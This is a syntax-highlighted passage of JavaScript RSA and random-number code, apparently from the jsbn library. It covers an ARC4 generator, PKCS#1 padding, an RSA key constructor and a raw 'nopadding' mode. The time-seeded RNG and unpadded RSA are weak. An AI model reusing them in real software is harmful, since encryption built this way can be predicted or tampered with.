<span class="w">    </span><span class="k">this</span><span class="p">.</span><span class="nx">S</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">S</span><span class="p">[</span><span class="nx">j</span><span class="p">];</span>
<span class="w">    </span><span class="k">this</span><span class="p">.</span><span class="nx">S</span><span class="p">[</span><span class="nx">j</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">t</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="k">this</span><span class="p">.</span><span class="nx">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span>
<span class="w">  </span><span class="k">this</span><span class="p">.</span><span class="nx">j</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="kd">function</span><span class="w"> </span><span class="nx">ARC4next</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="kd">var</span><span class="w"> </span><span class="nx">t</span><span class="p">;</span>
<span class="w">  </span><span class="k">this</span><span class="p">.</span><span class="nx">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">i</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mf">1</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="mf">255</span><span class="p">;</span>
<span class="w">  </span><span class="k">this</span><span class="p">.</span><span class="nx">j</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">j</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">S</span><span class="p">[</span><span class="k">this</span><span class="p">.</span><span class="nx">i</span><span class="p">])</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="mf">255</span><span class="p">;</span>
<span class="w">  </span><span class="nx">t</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">S</span><span class="p">[</span><span class="k">this</span><span class="p">.</span><span class="nx">i</span><span class="p">];</span>
<span class="w">  </span><span class="k">this</span><span class="p">.</span><span class="nx">S</span><span class="p">[</span><span class="k">this</span><span class="p">.</span><span class="nx">i</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">S</span><span class="p">[</span><span class="k">this</span><span class="p">.</span><span class="nx">j</span><span class="p">];</span>
<span class="w">  </span><span class="k">this</span><span class="p">.</span><span class="nx">S</span><span class="p">[</span><span class="k">this</span><span class="p">.</span><span class="nx">j</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">t</span><span class="p">;</span>
<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">S</span><span class="p">[(</span><span class="nx">t</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">S</span><span class="p">[</span><span class="k">this</span><span class="p">.</span><span class="nx">i</span><span class="p">])</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="mf">255</span><span class="p">];</span>
<span class="p">}</span>

<span class="c1">// Plug in your RNG constructor here</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">prng_newstate</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">Arcfour</span><span class="p">();</span>
<span class="p">}</span>

<span class="c1">// Mix in a 32-bit integer into the pool</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">rng_seed_int</span><span class="p">(</span><span class="nx">x</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="nx">rng_pool</span><span class="p">[</span><span class="nx">rng_pptr</span><span class="o">++</span><span class="p">]</span><span class="w"> </span><span class="o">^=</span><span class="w"> </span><span class="nx">x</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="mf">255</span><span class="p">;</span>
<span class="w">  </span><span class="nx">rng_pool</span><span class="p">[</span><span class="nx">rng_pptr</span><span class="o">++</span><span class="p">]</span><span class="w"> </span><span class="o">^=</span><span class="w"> </span><span class="p">(</span><span class="nx">x</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="mf">8</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="mf">255</span><span class="p">;</span>
<span class="w">  </span><span class="nx">rng_pool</span><span class="p">[</span><span class="nx">rng_pptr</span><span class="o">++</span><span class="p">]</span><span class="w"> </span><span class="o">^=</span><span class="w"> </span><span class="p">(</span><span class="nx">x</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="mf">16</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="mf">255</span><span class="p">;</span>
<span class="w">  </span><span class="nx">rng_pool</span><span class="p">[</span><span class="nx">rng_pptr</span><span class="o">++</span><span class="p">]</span><span class="w"> </span><span class="o">^=</span><span class="w"> </span><span class="p">(</span><span class="nx">x</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="mf">24</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="mf">255</span><span class="p">;</span>
<span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="nx">rng_pptr</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="nx">rng_psize</span><span class="p">)</span><span class="w"> </span><span class="nx">rng_pptr</span><span class="w"> </span><span class="o">-=</span><span class="w"> </span><span class="nx">rng_psize</span><span class="p">;</span>
<span class="p">}</span>

<span class="c1">// Mix in the current time (w/milliseconds) into the pool</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">rng_seed_time</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="nx">rng_seed_int</span><span class="p">(</span><span class="ow">new</span><span class="w"> </span><span class="nb">Date</span><span class="p">().</span><span class="nx">getTime</span><span class="p">());</span>
<span class="p">}</span>

<span class="kd">function</span><span class="w"> </span><span class="nx">rng_get_byte</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="nx">rng_state</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">rng_seed_time</span><span class="p">();</span>
<span class="w">    </span><span class="nx">rng_state</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">prng_newstate</span><span class="p">();</span>
<span class="w">    </span><span class="nx">rng_state</span><span class="p">.</span><span class="nx">init</span><span class="p">(</span><span class="nx">rng_pool</span><span class="p">);</span>
<span class="w">    </span><span class="k">for</span><span class="p">(</span><span class="nx">rng_pptr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span><span class="w"> </span><span class="nx">rng_pptr</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="nx">rng_pool</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span><span class="w"> </span><span class="o">++</span><span class="nx">rng_pptr</span><span class="p">)</span>
<span class="w">      </span><span class="nx">rng_pool</span><span class="p">[</span><span class="nx">rng_pptr</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span>
<span class="w">    </span><span class="nx">rng_pptr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span>
<span class="w">    </span><span class="c1">//rng_pool = null;</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="c1">// TODO: allow reseeding after first request</span>
<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="nx">rng_state</span><span class="p">.</span><span class="nx">next</span><span class="p">();</span>
<span class="p">}</span>

<span class="kd">function</span><span class="w"> </span><span class="nx">rng_get_bytes</span><span class="p">(</span><span class="nx">ba</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="kd">var</span><span class="w"> </span><span class="nx">i</span><span class="p">;</span>
<span class="w">  </span><span class="k">for</span><span class="p">(</span><span class="nx">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="nx">ba</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span><span class="w"> </span><span class="o">++</span><span class="nx">i</span><span class="p">)</span><span class="w"> </span><span class="nx">ba</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">rng_get_byte</span><span class="p">();</span>
<span class="p">}</span>

<span class="kd">function</span><span class="w"> </span><span class="nx">SecureRandom</span><span class="p">()</span><span class="w"> </span><span class="p">{}</span>

<span class="c1">// Depends on jsbn.js and rng.js</span>

<span class="c1">// Version 1.1: support utf-8 encoding in pkcs1pad2</span>

<span class="c1">// convert a (hex) string to a bignum object</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">parseBigInt</span><span class="p">(</span><span class="nx">str</span><span class="p">,</span><span class="nx">r</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">BigInteger</span><span class="p">(</span><span class="nx">str</span><span class="p">,</span><span class="nx">r</span><span class="p">);</span>
<span class="p">}</span>

<span class="kd">function</span><span class="w"> </span><span class="nx">linebrk</span><span class="p">(</span><span class="nx">s</span><span class="p">,</span><span class="nx">n</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="kd">var</span><span class="w"> </span><span class="nx">ret</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;&quot;</span><span class="p">;</span>
<span class="w">  </span><span class="kd">var</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span>
<span class="w">  </span><span class="k">while</span><span class="p">(</span><span class="nx">i</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">n</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="nx">s</span><span class="p">.</span><span class="nx">length</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">ret</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="nx">s</span><span class="p">.</span><span class="nx">substring</span><span class="p">(</span><span class="nx">i</span><span class="p">,</span><span class="nx">i</span><span class="o">+</span><span class="nx">n</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">&quot;\n&quot;</span><span class="p">;</span>
<span class="w">    </span><span class="nx">i</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="nx">n</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="nx">ret</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">s</span><span class="p">.</span><span class="nx">substring</span><span class="p">(</span><span class="nx">i</span><span class="p">,</span><span class="nx">s</span><span class="p">.</span><span class="nx">length</span><span class="p">);</span>
<span class="p">}</span>

<span class="kd">function</span><span class="w"> </span><span class="nx">byte2Hex</span><span class="p">(</span><span class="nx">b</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="nx">b</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mh">0x10</span><span class="p">)</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="s2">&quot;0&quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">b</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mf">16</span><span class="p">);</span>
<span class="w">  </span><span class="k">else</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">b</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mf">16</span><span class="p">);</span>
<span class="p">}</span>

<span class="c1">// PKCS#1 (type 2, random) pad input string s to n bytes, and return a bigint</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">pkcs1pad2</span><span class="p">(</span><span class="nx">s</span><span class="p">,</span><span class="nx">n</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="nx">n</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="nx">s</span><span class="p">.</span><span class="nx">length</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mf">11</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="c1">// TODO: fix for utf-8</span>
<span class="w">    </span><span class="nx">alert</span><span class="p">(</span><span class="s2">&quot;Message too long for RSA&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="kd">var</span><span class="w"> </span><span class="nx">ba</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nb">Array</span><span class="p">();</span>
<span class="w">  </span><span class="kd">var</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">s</span><span class="p">.</span><span class="nx">length</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mf">1</span><span class="p">;</span>
<span class="w">  </span><span class="k">while</span><span class="p">(</span><span class="nx">i</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mf">0</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">n</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">c</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">s</span><span class="p">.</span><span class="nx">charCodeAt</span><span class="p">(</span><span class="nx">i</span><span class="o">--</span><span class="p">);</span>
<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="nx">c</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mf">128</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="c1">// encode using utf-8</span>
<span class="w">      </span><span class="nx">ba</span><span class="p">[</span><span class="o">--</span><span class="nx">n</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">c</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="p">((</span><span class="nx">c</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">127</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="p">(</span><span class="nx">c</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mf">2048</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="nx">ba</span><span class="p">[</span><span class="o">--</span><span class="nx">n</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="nx">c</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="mf">63</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="mf">128</span><span class="p">;</span>
<span class="w">      </span><span class="nx">ba</span><span class="p">[</span><span class="o">--</span><span class="nx">n</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="nx">c</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="mf">6</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="mf">192</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="nx">ba</span><span class="p">[</span><span class="o">--</span><span class="nx">n</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="nx">c</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="mf">63</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="mf">128</span><span class="p">;</span>
<span class="w">      </span><span class="nx">ba</span><span class="p">[</span><span class="o">--</span><span class="nx">n</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">((</span><span class="nx">c</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="mf">6</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="mf">63</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="mf">128</span><span class="p">;</span>
<span class="w">      </span><span class="nx">ba</span><span class="p">[</span><span class="o">--</span><span class="nx">n</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="nx">c</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="mf">12</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="mf">224</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="nx">ba</span><span class="p">[</span><span class="o">--</span><span class="nx">n</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span>
<span class="w">  </span><span class="kd">var</span><span class="w"> </span><span class="nx">rng</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">SecureRandom</span><span class="p">();</span>
<span class="w">  </span><span class="kd">var</span><span class="w"> </span><span class="nx">x</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nb">Array</span><span class="p">();</span>
<span class="w">  </span><span class="k">while</span><span class="p">(</span><span class="nx">n</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">2</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="c1">// random non-zero pad</span>
<span class="w">    </span><span class="nx">x</span><span class="p">[</span><span class="mf">0</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span>
<span class="w">    </span><span class="k">while</span><span class="p">(</span><span class="nx">x</span><span class="p">[</span><span class="mf">0</span><span class="p">]</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="nx">rng</span><span class="p">.</span><span class="nx">nextBytes</span><span class="p">(</span><span class="nx">x</span><span class="p">);</span>
<span class="w">    </span><span class="nx">ba</span><span class="p">[</span><span class="o">--</span><span class="nx">n</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">x</span><span class="p">[</span><span class="mf">0</span><span class="p">];</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="nx">ba</span><span class="p">[</span><span class="o">--</span><span class="nx">n</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">2</span><span class="p">;</span>
<span class="w">  </span><span class="nx">ba</span><span class="p">[</span><span class="o">--</span><span class="nx">n</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span>
<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">BigInteger</span><span class="p">(</span><span class="nx">ba</span><span class="p">);</span>
<span class="p">}</span>

<span class="kd">function</span><span class="w"> </span><span class="nx">nopadding</span><span class="p">(</span><span class="nx">s</span><span class="p">,</span><span class="nx">n</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="nx">n</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="nx">s</span><span class="p">.</span><span class="nx">length</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="c1">// TODO: fix for utf-8</span>
<span class="w">        </span><span class="nx">alert</span><span class="p">(</span><span class="s2">&quot;Message too long for RSA&quot;</span><span class="p">);</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span>
<span class="w">    </span><span class="p">};</span>
<span class="w">    </span><span class="c1">//console.log(s, n)</span>
<span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">ba</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nb">Array</span><span class="p">();</span>
<span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span>
<span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">j</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span>
<span class="w">    </span><span class="k">while</span><span class="p">(</span><span class="nx">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="nx">s</span><span class="p">.</span><span class="nx">length</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">j</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="nx">n</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="kd">var</span><span class="w"> </span><span class="nx">c</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">s</span><span class="p">.</span><span class="nx">charCodeAt</span><span class="p">(</span><span class="nx">i</span><span class="o">++</span><span class="p">);</span>
<span class="w">        </span><span class="k">if</span><span class="p">(</span><span class="nx">c</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mf">128</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="c1">// encode using utf-8</span>
<span class="w">            </span><span class="nx">ba</span><span class="p">[</span><span class="nx">j</span><span class="o">++</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">c</span><span class="p">;</span>
<span class="w">        </span><span class="p">}</span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="p">((</span><span class="nx">c</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">127</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="p">(</span><span class="nx">c</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mf">2048</span><span class="p">)){</span>
<span class="w">            </span><span class="nx">ba</span><span class="p">[</span><span class="nx">j</span><span class="o">++</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="nx">c</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="mf">63</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="mf">128</span><span class="p">;</span>
<span class="w">            </span><span class="nx">ba</span><span class="p">[</span><span class="nx">j</span><span class="o">++</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="nx">c</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="mf">6</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="mf">192</span><span class="p">;</span>
<span class="w">        </span><span class="p">}</span><span class="k">else</span><span class="p">{</span>
<span class="w">            </span><span class="nx">ba</span><span class="p">[</span><span class="nx">j</span><span class="o">++</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="nx">c</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="mf">63</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="mf">128</span><span class="p">;</span>
<span class="w">            </span><span class="nx">ba</span><span class="p">[</span><span class="nx">j</span><span class="o">++</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">((</span><span class="nx">c</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="mf">6</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="mf">63</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="mf">128</span><span class="p">;</span>
<span class="w">            </span><span class="nx">ba</span><span class="p">[</span><span class="nx">j</span><span class="o">++</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="nx">c</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="mf">12</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="mf">224</span><span class="p">;</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">        </span><span class="p">};</span>
<span class="w">    </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="nx">j</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="nx">n</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">ba</span><span class="p">[</span><span class="nx">j</span><span class="o">++</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span>
<span class="w">        </span><span class="p">};</span>
<span class="w">    </span><span class="c1">//console.log(ba)</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">BigInteger</span><span class="p">(</span><span class="nx">ba</span><span class="p">);</span>
<span class="p">}</span>

<span class="c1">// &quot;empty&quot; RSA key constructor</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">RSAKey</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="k">this</span><span class="p">.</span><span class="nx">n</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span>
<span class="w">  </span><span class="k">this</span><span class="p">.</span><span class="nx">e</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span>
<span class="w">  </span><span class="k">this</span><span class="p">.</span><span class="nx">d</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span>
<span class="w">  </span><span class="k">this</span><span class="p">.</span><span class="nx">p</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span>
<span class="w">  </span><span class="k">this</span><span class="p">.</span><span class="nx">q</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span>
<span class="w">  </span><span class="k">this</span><span class="p">.</span><span class="nx">dmp1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span>
<span class="w">  </span><span class="k">this</span><span class="p">.</span><span class="nx">dmq1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span>
<span class="w">  </span><span class="k">this</span><span class="p">.</span><span class="nx">coeff</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span>
<span class="p">}</span>

<span class="c1">// Set the public key fields N and e from hex strings</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">RSASetPublic</span><span class="p">(</span><span class="nx">N</span><span class="p">,</span><span class="nx">E</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="nx">N</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">E</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">N</span><span class="p">.</span><span class="nx">length</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">0</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">E</span><span class="p">.</span><span class="nx">length</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">this</span><span class="p">.</span><span class="nx">n</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">parseBigInt</span><span class="p">(</span><span class="nx">N</span><span class="p">,</span><span class="mf">16</span><span class="p">);</span>
<span class="w">    </span><span class="k">this</span><span class="p">.</span><span class="nx">e</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">parseInt</span><span class="p">(</span><span class="nx">E</span><span class="p">,</span><span class="mf">16</span><span class="p">);</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="k">else</span>
<span class="w">    </span><span class="nx">alert</span><span class="p">(</span><span class="s2">&quot;Invalid RSA public key&quot;</span><span class="p">);</span>
<span class="p">}</span>

<span class="c1">// Perform raw public operation on &quot;x&quot;: return x^e (mod n)</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">RSADoPublic</span><span class="p">(</span><span class="nx">x</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
